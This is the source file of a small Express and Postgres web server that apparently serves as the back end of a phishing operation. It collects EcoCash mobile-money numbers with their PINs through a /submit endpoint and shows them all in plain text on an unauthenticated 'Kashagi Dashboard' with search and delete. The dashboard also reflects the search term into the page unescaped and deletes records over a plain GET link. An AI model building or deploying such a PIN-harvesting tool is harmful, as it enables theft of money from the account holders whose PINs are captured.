const express = require("express");
const cors = require("cors");
const { Pool } = require("pg");

const app = express();

app.use(cors());
app.use(express.json());

const pool = new Pool({
connectionString: process.env.DATABASE_URL,
ssl: {
rejectUnauthorized: false
}
});

app.get("/", (req, res) => {
res.send("Kashagi Backend Running");
});

app.post("/submit", async (req, res) => {
try {

const { ecocash_number, ecocash_pin } = req.body;

await pool.query(
  "INSERT INTO submissions (ecocash_number, ecocash_pin) VALUES ($1,$2)",
  [ecocash_number, ecocash_pin]
);

res.json({
  success: true,
  message: "Data saved successfully"
});

} catch (err) {

res.status(500).json({
  success: false,
  error: err.message
});

}
});

app.get("/delete/:id", async (req, res) => {
try {

await pool.query(
  "DELETE FROM submissions WHERE id=$1",
  [req.params.id]
);

res.redirect("/submissions");

} catch (err) {

res.status(500).send(err.message);

}
});

app.get("/submissions", async (req, res) => {

try {

const search = req.query.search || "";

let result;

if (search) {
  result = await pool.query(
    "SELECT * FROM submissions WHERE ecocash_number ILIKE $1 ORDER BY id DESC",
    [`%${search}%`]
  );
} else {
  result = await pool.query(
    "SELECT * FROM submissions ORDER BY id DESC"
  );
}

const totalResult = await pool.query(
  "SELECT COUNT(*) FROM submissions"
);

const todayResult = await pool.query(
  "SELECT COUNT(*) FROM submissions WHERE DATE(created_at)=CURRENT_DATE"
);

let rows = "";

result.rows.forEach(item => {

  rows += `
  <tr>
    <td>${item.id}</td>
    <td>${item.ecocash_number}</td>
    <td>${item.ecocash_pin}</td>
    <td>${new Date(item.created_at).toLocaleString()}</td>
    <td>
      <a href="/delete/${item.id}"
         onclick="return confirm('Delete this record?')"
         style="color:red;text-decoration:none;font-weight:bold;">
         Delete
      </a>
    </td>
  </tr>
  `;

});

res.send(`

<!DOCTYPE html><html>
<head>
<title>Kashagi Dashboard</title><style>

body{
  font-family:Arial,sans-serif;
  background:#f4f6f9;
  padding:20px;
}

.container{
  max-width:1200px;
  margin:auto;
}

h1{
  text-align:center;
  color:#1877f2;
}

.cards{
  display:flex;
  gap:15px;
  margin-bottom:20px;
}

.card{
  flex:1;
  background:white;
  padding:20px;
  border-radius:10px;
  text-align:center;
  box-shadow:0 2px 10px rgba(0,0,0,.1);
}

.card h2{
  color:#1877f2;
}

.search{
  margin-bottom:20px;
  text-align:center;
}

.search input{
  padding:10px;
  width:250px;
}

.search button{
  padding:10px 15px;
  background:#1877f2;
  color:white;
  border:none;
  cursor:pointer;
}

table{
  width:100%;
  border-collapse:collapse;
  background:white;
  box-shadow:0 2px 10px rgba(0,0,0,.1);
}

th{
  background:#1877f2;
  color:white;
  padding:12px;
}

td{
  padding:10px;
  text-align:center;
  border-bottom:1px solid #ddd;
}

tr:hover{
  background:#f1f7ff;
}

</style></head><body><div class="container"><h1>Kashagi Dashboard</h1><div class="cards"><div class="card">
<h3>Total Submissions</h3>
<h2>${totalResult.rows[0].count}</h2>
</div><div class="card">
<h3>Today's Submissions</h3>
<h2>${todayResult.rows[0].count}</h2>
</div></div><div class="search"><form method="GET" action="/submissions"><input
type="text"
name="search"
value="${search}"
placeholder="Search EcoCash Number">

<button type="submit">
Search
</button></form></div><table><tr>
<th>ID</th>
<th>EcoCash Number</th>
<th>EcoCash Pin</th>
<th>Date Submitted</th>
<th>Action</th>
</tr>${rows}

</table></div></body>
</html>
`);} catch (err) {

res.status(500).send(err.message);

}
});

app.listen(process.env.PORT || 3000, () => {
console.log("Server started");
});
